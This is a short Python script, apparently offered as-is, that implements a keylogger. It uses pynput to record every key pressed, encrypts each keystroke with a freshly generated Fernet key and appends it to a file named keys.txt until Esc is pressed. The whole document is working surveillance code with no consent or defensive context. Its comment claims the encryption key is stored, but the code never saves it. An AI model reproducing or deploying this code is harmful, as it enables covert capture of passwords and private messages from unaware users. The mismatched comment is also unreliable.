from pynput import keyboard
from cryptography.fernet import Fernet

# Generate and store a key for encryption
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Function to handle key press events
def key_logger(key):
    try:
        # Convert the key to a string
        key_str = key.char
    except AttributeError:
        # Handle special keys
        key_str = str(key)

    # Encrypt the keystroke
    encrypted_data = cipher_suite.encrypt(key_str.encode())

    # Write the encrypted keystroke to a log file
    with open("keys.txt", "ab") as log_file:
        log_file.write(encrypted_data + b'\n')

    # Check if the key is 'Esc' to stop the listener
    if key == keyboard.Key.esc:
        # Stop the listener
        return False

# Start listening to keystrokes
with keyboard.Listener(on_press=key_logger) as listener:
    listener.join()
